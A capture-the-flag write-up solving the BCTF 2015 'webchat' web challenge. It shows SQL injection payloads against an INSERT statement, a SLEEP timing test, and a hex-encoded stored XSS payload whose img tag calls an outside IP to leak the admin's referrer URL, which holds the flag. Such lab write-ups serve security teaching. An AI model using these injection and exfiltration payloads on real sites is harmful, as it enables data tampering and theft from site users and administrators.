## BCTF 2015 - webchat (Web 325)
##### 21-23/03/2015 (48hr)
___

### Description: 
http://146.148.60.107:9991/
___
### Solution


It's a classic SQLi on INSERT statement:
```
foo' 'bar
foo',0x61),('foo
foo',0x61, 0x62),('foo
bar'), ('asd					--> 35146 foo: bar (it doesn't send the last one)
bar', 0x62 ), (0x61,'asd
bar'), (SLEEP(2)), ('bla		--> works! returns after 2 secs! :)
```
The SQL statement is:
```
	insert into t values('nick', 'msg')
	insert into t values('nick', 'msg'),('asd')
```

Let's try XSS because we know that the admin will read our messages:
```
'),(0x3c696d67207372633d22687474703a2f2f3132382e3231312e3138392e32312f666f6f223e),('	
--> (hex encode of: <img src="http://128.211.189.21/foo"> )
```

From the logs we can see the flag in referral:
```
http://127.0.0.1:9991/review?pass=QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ==&id=40379
```

We base64 decode the pass: QkNURnt4c3NfaXNfbm90X3RoYXRfZGlmZmljdWx0X3JpZ2h0fQ== and we get the flag: 
**BCTF{xss_is_not_that_difficult_right}**
___